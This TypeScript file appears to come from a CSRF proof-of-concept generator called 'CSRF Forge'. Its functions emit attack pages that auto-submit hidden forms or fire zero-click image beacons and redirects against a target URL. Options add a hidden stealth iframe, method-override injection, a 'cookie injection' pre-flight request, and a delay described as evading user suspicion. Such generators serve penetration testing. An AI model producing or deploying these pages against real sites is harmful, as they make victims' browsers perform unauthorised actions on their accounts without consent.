import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString, extractPreflightUrl } from './types';
import { parseUrlEncodedBody, extractQueryParams } from '../parser/httpParser';

/**
 * Builds a full URL with parameters encoded into the query string.
 * Supports optional method override injection.
 */
function buildDirectUrl(
  baseUrl: string,
  params: Record<string, string>,
  methodOverride?: string
): string {
  const allParams = { ...params };
  if (methodOverride) {
    allParams['_method'] = methodOverride;
  }
  const searchParams = new URLSearchParams(allParams);
  return `${baseUrl}?${searchParams.toString()}`;
}

/**
 * Generates an auto-submitting HTML form PoC.
 * When keepQueryInUrl is true for GET requests, generates a direct URL
 * exploit (<img> beacon + window.location) instead of a form with hidden inputs.
 */
export function generateHtmlFormPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const stealthIframe = options.stealthIframe === true;
  const delayMs = options.delayMs || 0;
  const buttonText = options.buttonText || 'Submit Request';
  const includeComments = options.comments !== false;

  // Determine parameters to include
  const method = request.method.toUpperCase();
  const isGet = method === 'GET';
  const queryParams = extractQueryParams(request.url);
  const parsedParams =
    isGet && Object.keys(queryParams).length > 0
      ? queryParams
      : parseUrlEncodedBody(request.body);

  const bodyParams = options.customParameters || parsedParams;

  // Inject method override parameter when requested
  if (options.methodOverride && !bodyParams['_method']) {
    bodyParams['_method'] = options.methodOverride;
  }

  // When keepQueryInUrl is enabled for GET requests with query params,
  // generate a direct URL exploit instead of a form
  if (isGet && options.keepQueryInUrl && Object.keys(queryParams).length > 0) {
    return generateDirectUrlPoc(request, bodyParams, options);
  }

  // For GET requests, clean the query string from the form action URL
  // so the browser's form submission algorithm does not strip or duplicate parameters
  const targetUrl =
    isGet && Object.keys(queryParams).length > 0
      ? request.url.split('?')[0] || request.url
      : request.url;

  const iframeName = 'csrf_forge_stealth_frame';
  const formId = 'csrf_form';

  const preflight =
    options.preflight?.enabled && options.preflight.url?.trim()
      ? {
          url: extractPreflightUrl(options.preflight.url),
          mode: options.preflight.triggerMode || 'onerror',
        }
      : null;

  const submitStatement =
    delayMs > 0
      ? `setTimeout(function() { document.getElementById('${formId}').submit(); }, ${delayMs});`
      : `document.getElementById('${formId}').submit();`;

  const inputsHtml = Object.entries(bodyParams)
    .map(
      ([key, val]) =>
        `      <input type="hidden" name="${escapeHtml(key)}" value="${escapeHtml(val)}" />`
    )
    .join('\n');

  let preflightHtml = '';
  let scriptHtml = '';

  if (preflight) {
    if (preflight.mode === 'fetch') {
      preflightHtml = `\n    <!-- Pre-flight trigger via Fetch API -->\n    <script>
      fetch(${escapeJsString(preflight.url)}, { mode: 'no-cors' })
        .finally(function() {
          ${autoSubmit ? submitStatement : '// Pre-flight executed; waiting for manual submission'}
        });
    </script>\n`;
    } else {
      const eventAttr = preflight.mode === 'onload' ? 'onload' : 'onerror';
      const handler = autoSubmit ? ` ${eventAttr}="${submitStatement}"` : '';
      preflightHtml = `\n    <!-- Pre-flight trigger / Cookie injection payload (${preflight.mode}) -->\n    <img src="${escapeHtml(
        preflight.url
      )}"${handler} style="display:none;" />\n`;
    }
  } else if (autoSubmit) {
    if (delayMs > 0) {
      scriptHtml = `
    <script>
      // Delay auto-submit to evade initial user suspicion
      setTimeout(function() {
        document.getElementById('${formId}').submit();
      }, ${delayMs});
    </script>`;
    } else {
      scriptHtml = `
    <script>
      // Auto-submit on DOM payload execution
      document.getElementById('${formId}').submit();
    </script>`;
    }
  }

  const iframeHtml = stealthIframe
    ? `\n    <!-- Hidden stealth iframe to swallow redirect & prevent top-frame navigation -->\n    <iframe name="${iframeName}" style="display:none;width:0;height:0;border:0;"></iframe>\n`
    : '';

  const commentsHeader = includeComments
    ? `  <!--
    CSRF Forge Proof of Concept
    Target URL: ${escapeHtml(targetUrl)}
    Method: ${method}
    Vector: HTML Form Submission${preflight ? ` with Pre-flight Cookie Injection (${preflight.mode})` : ''}
    ${preflight ? `Pre-flight URL: ${escapeHtml(preflight.url)}\n    ` : ''}Generated: ${new Date().toISOString()}
  -->\n`
    : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification PoC</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
${commentsHeader}${iframeHtml}${preflightHtml}    <form id="${formId}" action="${escapeHtml(targetUrl)}" method="${method}"${
    stealthIframe ? ` target="${iframeName}"` : ''
  }>
${inputsHtml}
      <noscript>
        <p>JavaScript is disabled. Click below to continue:</p>
        <button type="submit">${escapeHtml(buttonText)}</button>
      </noscript>
      ${
        !autoSubmit
          ? `<button type="submit" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">${escapeHtml(
              buttonText
            )}</button>`
          : ''
      }
    </form>${scriptHtml}
</body>
</html>`;
}

/**
 * Generates a direct URL exploit PoC for GET requests where parameters
 * stay encoded in the query string (no form / hidden inputs).
 * Uses <img> beacon for zero-click and window.location for top-level navigation.
 */
function generateDirectUrlPoc(
  request: ParsedRequest,
  params: Record<string, string>,
  options: Partial<PocGeneratorOptions>
): string {
  const autoSubmit = options.autoSubmit !== false;
  const delayMs = options.delayMs || 0;
  const buttonText = options.buttonText || 'Trigger Request';
  const includeComments = options.comments !== false;

  const baseUrl = request.url.split('?')[0] || request.url;
  const fullUrl = buildDirectUrl(baseUrl, params, undefined); // methodOverride already in params

  const preflight =
    options.preflight?.enabled && options.preflight.url?.trim()
      ? {
          url: extractPreflightUrl(options.preflight.url),
          mode: options.preflight.triggerMode || 'onerror',
        }
      : null;

  const navigateStatement =
    delayMs > 0
      ? `setTimeout(function() { window.location.href = ${escapeJsString(fullUrl)}; }, ${delayMs});`
      : `window.location.href = ${escapeJsString(fullUrl)};`;

  let preflightHtml = '';
  let scriptHtml = '';

  if (preflight) {
    if (preflight.mode === 'fetch') {
      preflightHtml = `\n    <!-- Pre-flight trigger via Fetch API -->\n    <script>
      fetch(${escapeJsString(preflight.url)}, { mode: 'no-cors' })
        .finally(function() {
          ${autoSubmit ? navigateStatement : '// Pre-flight executed; waiting for manual trigger'}
        });
    </script>\n`;
    } else {
      const eventAttr = preflight.mode === 'onload' ? 'onload' : 'onerror';
      const handler = autoSubmit ? ` ${eventAttr}="${navigateStatement.replace(/"/g, '&quot;')}"` : '';
      preflightHtml = `\n    <!-- Pre-flight trigger / Cookie injection payload (${preflight.mode}) -->\n    <img src="${escapeHtml(
        preflight.url
      )}"${handler} style="display:none;" />\n`;
    }
  } else if (autoSubmit) {
    scriptHtml = `\n    <script>\n      // Zero-click: redirect victim to target URL with full query params\n      ${navigateStatement}\n    </script>`;
  }

  const commentsHeader = includeComments
    ? `  <!--
    CSRF Forge Proof of Concept
    Target URL: ${escapeHtml(fullUrl)}
    Method: GET (Direct URL — parameters in query string)
    Vector: Zero-Click URL Redirect${preflight ? ` with Pre-flight (${preflight.mode})` : ''}
    ${preflight ? `Pre-flight URL: ${escapeHtml(preflight.url)}\n    ` : ''}Generated: ${new Date().toISOString()}
  -->\n`
    : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification PoC</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
${commentsHeader}    <!-- Zero-click image beacon (fires GET request with full query params) -->
    <img src="${escapeHtml(fullUrl)}" style="display:none;" />${preflightHtml}${
    !autoSubmit
      ? `\n    <button onclick="${navigateStatement.replace(/"/g, '&quot;')}" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">${escapeHtml(
          buttonText
        )}</button>`
      : ''
  }${scriptHtml}
</body>
</html>`;
}
